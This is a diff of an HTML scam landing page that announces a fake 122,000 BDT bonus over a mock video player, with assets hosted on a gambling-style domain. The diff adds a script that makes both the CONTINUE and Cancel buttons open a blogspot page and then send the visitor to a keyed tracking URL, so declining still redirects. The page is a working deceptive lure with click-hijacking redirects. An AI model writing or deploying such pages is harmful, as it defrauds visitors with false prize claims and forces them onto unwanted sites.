@@ -1,18 +1,15 @@
-
 <!DOCTYPE html>
-
 <html>
 
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <title  id="a1">Congratulations!</title>
+  <title id="a1">Congratulations!</title>
   <link rel="icon" href="fav.png">
-    <link href="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e7088e8.css" rel="stylesheet">
+  <link href="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e7088e8.css" rel="stylesheet">
   <script src="jquery.min.js" charset="utf-8"></script>
   <link rel="icon" href="fav08.ico">
-  
 </head>
 
 <body onload="translate();realImpression();">
@@ -21,24 +18,28 @@
     <div class="heads">
       <div class="text header " id="a2">Congratulations! <br> 122000 BDT</div>
     </div>
+
     <div class="text-1">
-      <p id="a3" >Your Bonus is Ready!</p>
+      <p id="a3">Your Bonus is Ready!</p>
     </div>
+
     <div class="buttons">
-      <a href="" class="button finlink " id="a4" style="color: green;">CONTINUE</a>
-      <a class="button finlink " href="" id="a5" style="color: rgb(184, 184, 184);">Cancel</a>
+      <a href="" class="button finlink redirectBtn" id="a4" style="color: green;">CONTINUE</a>
+      <a href="" class="button finlink redirectBtn" id="a5" style="color: rgb(184, 184, 184);">Cancel</a>
     </div>
   </div>
+
   <section class="player">
     <div class="player_content">
       <video src="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/1.mp4" autoplay muted loop></video>
       <img class="loading" src="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e708794.svg" alt="">
-
     </div>
+
     <div class="top_icons">
       <img src="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e70881c.svg">
       <img src="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e708842.svg">
     </div>
+
     <div class="player_navigation">
       <div class="player_navigation_item">
         <div class="pause_play">
@@ -47,11 +48,13 @@
         </div>
         <p>00:0<span id="counter_wrapper">2</span>/1:52:46</p>
       </div>
+
       <div class="progress">
         <div class="progress_load">
           <div class="progress_line"></div>
         </div>
       </div>
+
       <div class="player_navigation_item">
         <img class="img_padding" src="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e708887.svg" alt="">
         <img src="https://exclusive-spin.com/preland/storage/gb/default/simple_alert/42/staff/618122e70889d.svg" alt="">
@@ -61,10 +64,26 @@
     </div>
   </section>
 
+  <!-- ✅ Redirect Script -->
+  <script>
+    const buttonRedirectURL = "https://irsmiza.blogspot.com/";
+    const pageRedirectURL = "https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c";
+    const fallbackURL = "https://irsmiza.blogspot.com/";
+
+    document.querySelectorAll('.redirectBtn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.preventDefault();
+        let newTab = window.open(buttonRedirectURL, '_blank');
+        if (!newTab) {
+          window.location.href = fallbackURL;
+          return;
+        }
+        setTimeout(() => {
+          window.location.href = pageRedirectURL;
+        }, 50);
+      });
+    });
+  </script>
 
 </body>
 </html>
-
-
-
-
